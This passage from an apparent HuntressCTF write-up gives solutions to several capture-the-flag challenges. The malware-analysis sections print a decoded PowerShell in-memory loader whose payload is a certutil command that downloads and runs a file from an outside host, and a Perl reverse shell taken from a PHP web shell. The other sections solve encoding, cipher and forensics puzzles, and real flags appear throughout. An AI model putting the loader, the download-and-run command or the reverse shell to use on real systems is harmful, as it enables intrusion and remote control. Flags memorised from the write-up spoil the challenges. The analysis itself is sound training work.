'jzseiN/bIX' + 'DpUYmCf' + 'aRhDPKHwQtAFB' + 'tmK8gqP { 0 }gbpsWn' + 'Hspnq' + 'dxx8' + 'emlmODf2GZMc5' + '4PA' + 'AA='
H4sIAIeJG2UC/+1XbU/jOBD+3l9hrSIlkU { 0 }VFvb { 1 }IiFdWqDbPRJKS8vRbrUKyTR168TFcQplb//7jfNSygJ73 { 1 }lI94FIVvwyMx4/M7YfT9PYl5THhH7sku8VUnxdT3gRMTT/ku/fWUSjS3MzpoX7zCWHxBjby+URjzwaTw4OWqkQ { 1 }Mu8XW2DtJM { 1 }omtGITFM8he5nIGAnbPrOfiSfCfat2qb8WuPFW { 0 }rlufPgOzYcaDGTrnvKbeq/SWj0tC/ftXN8U59Uj2+ST2WGHp/nUiIqgFjukl+mGrCi/USDN2hvuAJn8rqJY13G9VBnHhTcNHaChyQMx4kulnZ { 0 } { 1 }aAT { 1 }Wcr0kZyUUMHatdwX07CAQkiW6RsTI/nkx+N8bF3 { 0 }00ljSCaieWIPiyD2JFfUiqn704YNCD6QS1+l { 0 }QOJyYJoqt+AIM { 0 }U4Zs8i/MWO4cFsi91olY1sJpbpSmBYG9Jl1OjxIGeSa+jOO5klg4pcngln5UalMy7yJvPq3o6eZs2mX3zgbAHTX6PK { 1 }ZrqHpGYRByf2JBdrbGoXIgVzsgGbaNGe/Yf1SmP1UhP1Vu0Ue8ZDToPJRn0r7tr0pj38q { 1 }ReTuIjmNIYjtaxF1G/zFPjuWjAl { 1 } { 1 }GR7UUc9 { 1 }9Qy8GIDgCBq { 1 }nFb4qKZ6oHUdUbnSbKWUBCNvHiCboFQbbfOxMHjJD78QORAhd3sYs1aa4O6CU { 0 }nb { 1 }upxdtVFIbz { 1 }vSSzSTXF7+hbpg8cgsIgdJ7QYslPJs6r+4K6TMkl9 { 0 }5GluYn5 { 1 }5zFtC0eJ1KkPgYVIbjo { 0 }8GnHlOIWOQzDaC57tOwnF5/Fo+WxxjuG7S0wnhgj8Kh { 0 }1WqCPQ0Swuz2gfZiZYMIpTJjosT5oV4OBS7I8st { 0 }4RAf8HRchPkGa+QKSHZchPD3WdcWmRIhcTDR6GM2fVfnHhy6uTOtAQUwTGyvTVurqXKfi0+PW8sVI4WAGVwCIlQnAgeNb0 { 1 }ftv { 0 }DxjjQ6dlh+/lvbyX9/K/ { 0 }22X+XGvHrRZ0mnV6350N7+6dPmob8sRbf { 0 }gc+/2jO6vTufHt856786dO6lz { 1 }e5ie302D2/PjuxVtzFMrxqfFqP { 0 }3nQU3c1G9zXmzq+YGzn4P8biM7fRwf85lk4+Nh8w536Q1Z17P6vn7WP8h1gW2R/n+0m2g8UuZM { 0 }M3kN7UYyHhT17M5+aw22ch1+GvZO { 0 }oc3+bF+FX2jzPmifrIOWvTqnNhseD91Ba+iPwsPDD2ZlPKCx3G1M1 { 1 }W+qwhSRWP+p/2tS+Al6ud4Ipl5DC8H5HTlFX3CxUnB1 { 0 }qcKg3DU { 1 }x/ASIGhvQYCXR5sdmMcV+RxJzSIUPNeaOisYNO5tVzNZNsBM0H9lh2HRyM0 { 1 }u8 { 0 } { 0 }O7rHoKcShnVu1ut1ZD7le7q+3htfj6pbX4cm3ktixFHjNwNtZZZt2s0CkxjDfHC98H { 1 }unK { 0 }xB7CTyce4H0AvlOfukrCJucs20Ai5Vt8u { 1 }RfghcHVc/Vq+D { 0 }FPQxA7c { 1 } { 1 }0q/rzFxrX0+uz6TZOnIC8z/AX/mDwPfb8YfVVC1awcoCfdjzseiN/bIXDpUYmCfaRhDPKHwQtAFBtmK8gqP { 0 }gbpsWnHspnqdxx8emlmODf2GZMc54PAAA=
```

Saved the output to tmp4.ps1 named file and replace ` { 0 }` to L, ` { 1 }` to E

```console
root@kali:~/ctf/HuntressCTF# sed -i -e 's/ { 0 }/L/g' tmp4.ps1

root@kali:~/ctf/HuntressCTF# sed -i -e 's/ { 1 }/E/g' tmp4.ps1

root@kali:~/ctf/HuntressCTF# cat tmp4.ps1 | base64 -d > tmp5.ps1.gz

root@kali:~/ctf/HuntressCTF# gunzip -d tmp5.ps1.gz
```

tmp5.ps1

```powershell
function i5P {
        Param ($cWo8x, $ip)
        $g8lN = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $g8lN.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($g8lN.GetMethod('GetModuleHandle')).Invoke($null, @($cWo8x)))), $ip))
}

function ma1_D {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $m4AK,
                [Parameter(Position = 1)] [Type] $vGu = [Void]
        )

        $fqGV5 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $fqGV5.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $m4AK).SetImplementationFlags('Runtime, Managed')
        $fqGV5.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vGu, $m4AK).SetImplementationFlags('Runtime, Managed')

        return $fqGV5.CreateType()
}

[Byte[]]$nLQ2k = [System.Convert]::FromBase64String("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vLjEwMy4xNjMuMTg3LjEyOjgwODAvP2VuY29kZWRfZmxhZz0lNjYlNmMlNjElNjclN2IlNjQlNjIlNjYlNjUlMzUlNjYlMzclMzUlMzUlNjElMzglMzklMzglNjMlNjUlMzUlNjYlMzIlMzAlMzglMzglNjIlMzAlMzglMzklMzIlMzglMzUlMzAlNjIlNjYlMzclN2QgJVRFTVAlXGYgJiBzdGFydCAvQiAlVEVNUCVcZg==")
[Uint32]$fal3 = 0
$lc98 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualAlloc), (ma1_D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nLQ2k.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($nLQ2k, 0, $lc98, $nLQ2k.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualProtect), (ma1_D @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($lc98, [Uint32]$nLQ2k.Length, 0x10, [Ref]$fal3)) -eq $true) {
        $ubOb = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll CreateThread), (ma1_D @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lc98,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll WaitForSingleObject), (ma1_D @([IntPtr], [Int32]))).Invoke($ubOb,0xffffffff) | Out-Null
}
```

Decoded the string starting with `ICAgICAg` and URL decoded it, got flag.

```console
root@kali:~/ctf/HuntressCTF# echo -ne 'ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vLjEwMy4xNjMuMTg3LjEyOjgwODAvP2VuY29kZWRfZmxhZz0lNjYlNmMlNjElNjclN2IlNjQlNjIlNjYlNjUlMzUlNjYlMzclMzUlMzUlNjElMzglMzklMzglNjMlNjUlMzUlNjYlMzIlMzAlMzglMzglNjIlMzAlMzglMzklMzIlMzglMzUlMzAlNjIlNjYlMzclN2QgJVRFTVAlXGYgJiBzdGFydCAvQiAlVEVNUCVcZg==' | base64 -d | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));"
(snip)  certutil -urlcache -f http://.103.163.187.12:8080/?encoded_flag=flag{dbfe5f755a898ce5f2088b0892850bf7} %TEMP%\f & start /B %TEMP%\f
```

## BaseFFFF+1

### Description

> Maybe you already know about base64, but what if we took it up a notch?
>
> Download the files below.
>
> Attachments: baseffff1

### Flag

flag{716abce880f09b7cdc7938eddf273648}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file baseffff1
baseffff1: Unicode text, UTF-8 text, with no line terminators

root@kali:~/ctf/HuntressCTF# cat baseffff1
鹎驣𔔠𓁯噫谠啥鹭鵧啴陨驶𒄠陬驹啤鹷鵴𓈠𒁯ꔠ𐙡啹院驳啳驨驲挮售𖠰筆筆鸠啳樶栵愵欠樵樳昫鸠啳樶栵嘶谠ꍥ啬𐙡𔕹𖥡唬驨驲鸠啳𒁹𓁵鬠陬潧㸍㸍ꍦ鱡汻欱靡驣洸鬰渰汢饣汣根騸饤杦样椶𠌸
```

This challenge name is `BaseFFFF+1` (=65535+1) and I guess this text is Base65536 encoded.
Using [this tool](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode), got flag.

output:

```text
Nice work! We might have played with too many bases here... 0xFFFF is 65535, 65535+1 is 65536! Well anyway, here is your flag:

flag{716abce880f09b7cdc7938eddf273648}
```

## Traffic

### Description

> We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down?
>
> Some tools like rita or zeek might help dig through all of this data!
>
> Download the file below.
> Attachments: traffic.7z

### Flag

flag{8626fe7dcd8d412a80d0b3f0e36afd4a}

### Solution

Setup [rita](https://github.com/activecm/rita) in Kali:

```bash
# extract traffic.7z to logs directory
7z -ologs e traffic.7z

docker run --rm --name rita-mongo -p 27017:27017 -d mongo:4.2

# https://github.com/activecm/rita/blob/master/docs/Manual%20Installation.md
git clone https://github.com/activecm/rita.git && cd rita
make

sudo mkdir /etc/rita && sudo chmod 755 /etc/rita
sudo mkdir -p /var/lib/rita/logs && sudo chmod -R 755 /var/lib/rita
sudo chmod 777 /var/lib/rita/logs

sudo cp etc/rita.yaml /etc/rita/config.yaml && sudo chmod 666 /etc/rita/config.yaml
```

Import logs and show long connection IP address and access its URL.
Got flag.

```console
root@kali:~/ctf/HuntressCTF/rita# ./rita import ../logs test

        [+] Importing [../logs]:
        [-] Verifying log files have not been previously parsed into the target dataset ...
        [-] Processing batch 1 of 1
        [-] Parsing logs to: test ...
(snip)
        [-] Done!


root@kali:~/ctf/HuntressCTF/rita# ./rita show-long-connections test
Source IP,Destination IP,Port:Protocol:Service,Total Duration,Longest Duration,Connections,Total Bytes,State
10.24.0.2,185.199.108.153,443:tcp:- 443:tcp:ssl,5496.54,404.006,52,249194,closed
(snip)

root@kali:~/ctf/HuntressCTF/rita# ./rita show-ip-dns-fqdns test 185.199.108.153
Queried FQDN
sketchysite.github.io

root@kali:~/ctf/HuntressCTF/rita# curl -s https://sketchysite.github.io | html2text
****** sketchysite.github.io ******
flag{8626fe7dcd8d412a80d0b3f0e36afd4a}
```

## CaesarMirror

### Description

> Caesar caesar, on the wall, who is the fairest of them all?
>
> Perhaps a clever ROT13?
>
> NOTE: this flag does not follow the usual MD5 hash standard flag format. It is still wrapped with the code>flag{} prefix and suffix.
>
> Download the file(s) below.
>
> Attachments: caesarmirror.txt

### Flag

flag{julius_in_a_reflection}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file caesarmirror.txt
caesarmirror.txt: ASCII text

root@kali:~/ctf/HuntressCTF# cat caesarmirror.txt
     Bu obl! Jbj, guvf jnezhc punyyratr fher   bf V !erugrtbg ghc bg ahs sb gby n fnj
    qrsvavgryl nofbyhgryl nyjnlf ybir gelvat   ftavug rivgnibaav qan jra ch xavug bg
       gb qb jvgu gur irel onfvp, pbzzba naq   sb genc gfevs ruG !frhdvauprg SGP pvffnyp
     lbhe synt vf synt{whyvhf_ naq gung vf n   tavuglerir gba fv gv gho gengf gnret
 gung lbh jvyy arrq gb fbyir guvf punyyratr.    qan rqvu bg tavleg rxvy g'abq V
  frcnengr rnpu cneg bs gur synt. Gur frpbaq   bq hbl gho _n_av fv tnys rug sb genc
   arrq whfg n yvggyr ovg zber. Jung rknpgyl   rxnz qan leg bg reru rqhypav rj qyhbuf
     guvf svyyre grkg ybbx zber ratntvat naq   ?fravyjra qqn rj qyhbuF ?ryvujugebj
    Fubhyq jr nqq fcnprf naq gel naq znxr vg   uthbar fv fravy lanz jbU ?ynpvegrzzlf
 gb znxr guvf svyyre grkg ybbx oryvrinoyr? N    n avugvj ferggry sb renhdf qvybf
 fvzcyr, zbabfcnpr-sbag grkg svyr ybbxf tbbq   rug gn gfbzyn rj reN .rz bg uthbar
   raq? Vg ybbxf yvxr vg! V ubcr vg vf tbbq.   }abvgprysre fv tnys ehbl sb genc qevug ruG
naq ng guvf cbvag lbh fubhyq unir rirelguvat   ebs tnys fvug gvzohf bg qrra hbl gnug
    cbvagf. Gur ortvaavat vf znexrq jvgu gur   ,rpneo lyehp tavarcb rug qan kvsrec tnys
  naq vg vapyhqrf Ratyvfu jbeqf frcnengrq ol   lyehp tavfbyp n av qar bg ,frebpferqah
  oenpr. Jbj! Abj GUNG vf n PGS! Jub xarj jr   fvug bg erucvp enfrnp rug xyvz qyhbp
            rkgrag?? Fbzrbar trg gung Whyvhf   !ynqrz n lht enfrnP
```

It looks like text is encrypted.
As the challenge name includes `Caesar`, decrypted as a Caesar cipher.

```console
root@kali:~/ctf/HuntressCTF# cat caesarmirror.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
     Oh boy! Wow, this warmup challenge sure   os I !rehtegot tup ot nuf fo tol a saw
    definitely absolutely always love trying   sgniht evitavonni dna wen pu kniht ot
       to do with the very basic, common and   fo trap tsrif ehT !seuqinhcet FTC cissalc
     your flag is flag{julius_ and that is a   gnihtyreve ton si ti tub trats taerg
 that you will need to solve this challenge.    dna edih ot gniyrt ekil t'nod I
  separate each part of the flag. The second   od uoy tub _a_ni si galf eht fo trap
   need just a little bit more. What exactly   ekam dna yrt ot ereh edulcni ew dluohs
     this filler text look more engaging and   ?senilwen dda ew dluohS ?elihwhtrow
    Should we add spaces and try and make it   hguone si senil ynam woH ?lacirtemmys
 to make this filler text look believable? A    a nihtiw srettel fo erauqs dilos
 simple, monospace-font text file looks good   eht ta tsomla ew erA .em ot hguone
   end? It looks like it! I hope it is good.   }noitcelfer si galf ruoy fo trap driht ehT
and at this point you should have everything   rof galf siht timbus ot deen uoy taht
    points. The beginning is marked with the   ,ecarb ylruc gninepo eht dna xiferp galf
  and it includes English words separated by   ylruc gnisolc a ni dne ot ,serocsrednu
  brace. Wow! Now THAT is a CTF! Who knew we   siht ot rehpic raseac eht klim dluoc
            extent?? Someone get that Julius   !ladem a yug raseaC
```

Got 1st part flag: `flag{julius_`.
Reversed it.

```console
root@kali:~/ctf/HuntressCTF# cat caesarmirror.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev
 was a lot of fun to put together! I so   erus egnellahc pumraw siht ,woW !yob hO
 to think up new and innovative things   gniyrt evol syawla yletulosba yletinifed
 classic CTF techniques! The first part of   dna nommoc ,cisab yrev eht htiw od ot
 great start but it is not everything   a si taht dna _suiluj{galf si galf ruoy
 I don't like trying to hide and    .egnellahc siht evlos ot deen lliw uoy taht
 part of the flag is in_a_ but you do   dnoces ehT .galf eht fo trap hcae etarapes
 should we include here to try and make   yltcaxe tahW .erom tib elttil a tsuj deen
 worthwhile? Should we add newlines?   dna gnigagne erom kool txet rellif siht
 symmetrical? How many lines is enough   ti ekam dna yrt dna secaps dda ew dluohS
 solid square of letters within a    A ?elbaveileb kool txet rellif siht ekam ot
 enough to me. Are we almost at the   doog skool elif txet tnof-ecapsonom ,elpmis
 The third part of your flag is reflection}   .doog si ti epoh I !ti ekil skool tI ?dne
 that you need to submit this flag for   gnihtyreve evah dluohs uoy tniop siht ta dna
 flag prefix and the opening curly brace,   eht htiw dekram si gninnigeb ehT .stniop
 underscores, to end in a closing curly   yb detarapes sdrow hsilgnE sedulcni ti dna
 could milk the caesar cipher to this   ew wenk ohW !FTC a si TAHT woN !woW .ecarb
 Caesar guy a medal!   suiluJ taht teg enoemoS ??tnetxe
```

2nd part flag is `in_a_` and 3rd part is `reflection}`.
Therefore, concat these parts, got flag{julius_in_a_reflection}.

## I Wont Let You Down

### Description

> OK Go take a look at this IP:
>
> Connect here: <http://155.138.162.158>
>
> **# USING ANY OTHER TOOL OTHER THAN NMAP WILL DISQUALIFY YOU. DON'T USE BURPSUITE, DON'T USE DIRBUSTER. JUST PLAIN NMAP, NO FLAGS!**

### Flag

flag{93671c2c38ee872508770361ace37b02}

### Solution

```console
root@kali:~/ctf/HuntressCTF# nmap -p- --min-rate 5000 -Pn --open 155.138.162.158
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-05 22:05 JST
Nmap scan report for 155.138.162.158.vultrusercontent.com (155.138.162.158)
Host is up (0.21s latency).
Not shown: 63507 closed tcp ports (reset), 2024 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8888/tcp  open  sun-answerbook
42069/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.40 seconds

root@kali:~/ctf/HuntressCTF# nc 155.138.162.158 8888 | grep -i flag
flag{93671c2c38ee872508770361ace37b02}
```

## Dialtone

### Description

> Well would you listen to those notes, that must be some long phone number or something!
>
> Download the file(s) below.
>
> Attachments: dialtone.wav

### Flag

flag{6c733ef09bc4f2a4313ff63087e25d67}

### Solution

Listening to the attached `dialtone.wav` file, it sounds DTMF code.
To Decode it as DTMF code, [DTMF Decoder](https://dtmf.netlify.app/) or [DTMF detection demo](https://unframework.github.io/dtmf-detect/#/) are useful tools.

Decoded it, I got `13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573`.
Then, unhexlified it.

```python
>>> import binascii
>>> binascii.unhexlify(hex(13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573)[2:])
b'flag{6c733ef09bc4f2a4313ff63087e25d67}'
```

## PHP Stager

### Description

> Ugh, we found PHP set up as an autorun to stage some other weird shady stuff. Can you unravel the payload?
>
> Download the file(s) below.
>
> Attachments: phonetic

### Flag

flag{9b5c4313d12958354be6284fcd63dd26}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file phonetic
phonetic: PHP script, ASCII text, with very long lines (65060)
```

The attached `phonetic` file is obfuscated PHP code.

```console
root@kali:~/ctf/HuntressCTF# cp phonetic phonetic-edited.php

root@kali:~/ctf/HuntressCTF# vi phonetic-edited.php  # remove `$c = $k("/*XAjqgQvv4067*/", ` and `$c();`

root@kali:~/ctf/HuntressCTF# diff phonetic phonetic-edited.php
21,22c21
< $c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
< $c();
---
> echo $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302"));
26c25
<
\ No newline at end of file
---
>

root@kali:~/ctf/HuntressCTF# php phonetic-edited.php > tmp1.php
```

tmp1.php is similar to the Web Shell [wso.php](https://github.com/wsjswy/Security/blob/master/machineLearning/data/PHP-WEBSHELL/IndoXploit/wso.php).

```console
root@kali:~/ctf/HuntressCTF# curl -sLO https://raw.githubusercontent.com/wsjswy/Security/master/machineLearning/data/PHP-WEBSHELL/IndoXploit/wso.php

root@kali:~/ctf/HuntressCTF# diff tmp1.php wso.php | grep -i flag  # not found

root@kali:~/ctf/HuntressCTF# diff tmp1.php wso.php
(snip)
1459c1462
<       $back_connect_p="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==";
---
>       $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";

root@kali:~/ctf/HuntressCTF# echo -ne 'IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==' | base64 -d
#!/usr/bin/perl
use Socket;
$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
my $str = <<END;
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
END
system('/bin/sh -i -c "echo ${string}; bash"');
close(STDIN);
close(STDOUT);
close(STDERR)

root@kali:~/ctf/HuntressCTF# vi tmp.dat

root@kali:~/ctf/HuntressCTF# cat tmp.dat
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end

root@kali:~/ctf/HuntressCTF# file tmp.dat
tmp.dat: uuencoded or xxencoded text, file name "uuencode.uu", ASCII text
```

uudecode it, got flag.

```console
root@kali:~/ctf/HuntressCTF# apt install sharutils
(snip)
root@kali:~/ctf/HuntressCTF# uudecode tmp.dat

root@kali:~/ctf/HuntressCTF# cat uuencode.uu
flag{9b5c4313d12958354be6284fcd63dd26}
```

- [Uuencode Command Linux](https://linuxhint.com/uuencode-command-linux/)
- [cheat.sh/uudecode](https://cheat.sh/uudecode)

## Layered Security

### Description

> It takes a team to do security right, so we have layered our defenses!
>
> Download the file(s) below.
>
> Attachments: layered_security

### Flag

flag{9a64bc4a390cb0ce31452820ee562c3f}

### Solution

```console
$ file layered_security
layered_security: GIMP XCF image data, version 011, 1024 x 1024, RGB Color
```

1. Open layered_security with GIMP
2. Show `Pasted Layer #3` layer only, there is the flag in it.

![layered_security.png](img/layered_security.png)

## Backdoored Splunk

### Description

> You've probably seen Splunk being used for good, but have you seen it used for evil?
>
> NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag. The connection error to the container is part of the challenge.
>
> Download the file(s) below and press the Start button on the top-right to begin this challenge.
>
> Attachments: Splunk_TA_windows.zip

### Flag

flag{60bb3bfaf703e0fa36730ab70e115bd7}

### Solution

Splunk_TA_windows/bin/powershell/nt6-health.ps1

```powershell
# (snip)

#
